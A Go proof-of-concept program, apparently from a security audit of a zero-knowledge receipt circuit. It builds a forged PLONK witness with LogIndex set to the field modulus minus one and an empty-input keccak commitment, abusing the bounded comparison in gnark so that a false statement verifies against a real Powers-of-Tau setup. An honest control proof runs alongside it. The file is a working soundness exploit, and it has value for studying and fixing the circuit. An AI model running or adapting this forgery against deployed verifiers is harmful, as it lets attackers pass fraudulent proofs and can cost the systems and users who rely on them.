// Command forgeproof upgrades soundprobe's probe-A finding from "gnark's test
// engine says the constraints are satisfied" to "a REAL PLONK proof against a
// REAL Perpetual-Powers-of-Tau ceremony verifies".
//
// The forged statement: LogIndex = P-1 (the field's -1). No loop index k ever
// equals it, so the circuit's log commitment degenerates to keccak256("") while
// AssertIsLess(LogIndex, nLogs) still passes, because gnark's BoundedComparator
// is only sound when |a-b| <= its absDiffUpp bound (here 2^34).
package main

import (
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"math/big"
	"os"
	"time"

	"m7zk/circuit"
	"m7zk/ptaufast"

	"github.com/consensys/gnark-crypto/ecc"
	"github.com/consensys/gnark-crypto/ecc/bn254/fr"
	"github.com/consensys/gnark/backend/plonk"
	"github.com/consensys/gnark/constraint"
	"github.com/consensys/gnark/frontend"
	"github.com/consensys/gnark/frontend/cs/scs"
)

type leafRow struct {
	Tx      int    `json:"tx"`
	LeafLen int    `json:"leaf_len"`
	NLogs   int    `json:"n_logs"`
	LeafHex string `json:"leaf_hex"`
}

func main() {
	ptau := flag.String("ptau", "", "real .ptau")
	tx := flag.Int("tx", 85, "")
	n := flag.Int("n", 384, "")
	logmax := flag.Int("logmax", 96, "")
	maxlogs := flag.Int("maxlogs", 4, "")
	flag.Parse()

	b, err := os.ReadFile("leaves.json")
	must(err)
	var rows []leafRow
	must(json.Unmarshal(b, &rows))
	var leaf []byte
	for _, r := range rows {
		if r.Tx == *tx {
			leaf, _ = hex.DecodeString(r.LeafHex)
		}
	}
	if leaf == nil {
		fmt.Println("tx not found")
		os.Exit(1)
	}

	p := circuit.Params{N: *n, LogMax: *logmax, MaxLogs: *maxlogs}
	ccs, err := frontend.Compile(ecc.BN254.ScalarField(), scs.NewBuilder, circuit.New(p))
	must(err)
	size := ecc.NextPowerOfTwo(uint64(ccs.GetNbConstraints()+ccs.GetNbPublicVariables())) + 3
	fmt.Printf("circuit: %d constraints, domain %d\n", ccs.GetNbConstraints(), size-3)

	t := time.Now()
	pf, err := ptaufast.Open(*ptau)
	must(err)
	srs, lag, err := pf.LoadPlonkSRS(size - 3)
	must(err)
	pf.Close()
	fmt.Printf("ptaufast SRS load: %.2fs (real PPOT ceremony, %d canonical pts)\n",
		time.Since(t).Seconds(), len(srs.Pk.G1))

	t = time.Now()
	pk, vk, err := plonk.Setup(ccs, srs, lag)
	must(err)
	fmt.Printf("plonk.Setup: %.2fs\n\n", time.Since(t).Seconds())

	// ---- honest control ----
	honest, err := circuit.Witness(p, leaf, 0)
	must(err)
	proveVerify("HONEST  (LogIndex = 0)", ccs, pk, vk, honest)

	// ---- forged ----
	forged, err := circuit.Witness(p, leaf, 0)
	must(err)
	forged.LogIndex = new(big.Int).Sub(fr.Modulus(), big.NewInt(1))
	empty := circuit.Keccak256(nil)
	forged.LogCommitHi = new(big.Int).SetBytes(empty[0:16])
	forged.LogCommitLo = new(big.Int).SetBytes(empty[16:32])
	proveVerify("FORGED  (LogIndex = P-1, LogCommit = keccak256(\"\"))", ccs, pk, vk, forged)
}

func proveVerify(label string, ccs constraint.ConstraintSystem, pk plonk.ProvingKey, vk plonk.VerifyingKey, a *circuit.ReceiptLeafCircuit) {
	w, err := frontend.NewWitness(a, ecc.BN254.ScalarField())
	if err != nil {
		fmt.Printf("%s: witness error: %v\n", label, err)
		return
	}
	pub, err := w.Public()
	must(err)
	t := time.Now()
	proof, err := plonk.Prove(ccs, pk, w)
	if err != nil {
		fmt.Printf("%s: PROVE FAILED: %v\n", label, err)
		return
	}
	el := time.Since(t).Seconds()
	err = plonk.Verify(proof, vk, pub)
	fmt.Printf("%s\n   plonk.Prove %.1fs -> plonk.Verify err = %v\n", label, el, err)
	if err == nil {
		fmt.Printf("   *** A REAL PROOF OF THIS STATEMENT VERIFIES ***\n")
	}
}

func must(err error) {
	if err != nil {
		fmt.Println("ERROR:", err)
		os.Exit(1)
	}
}
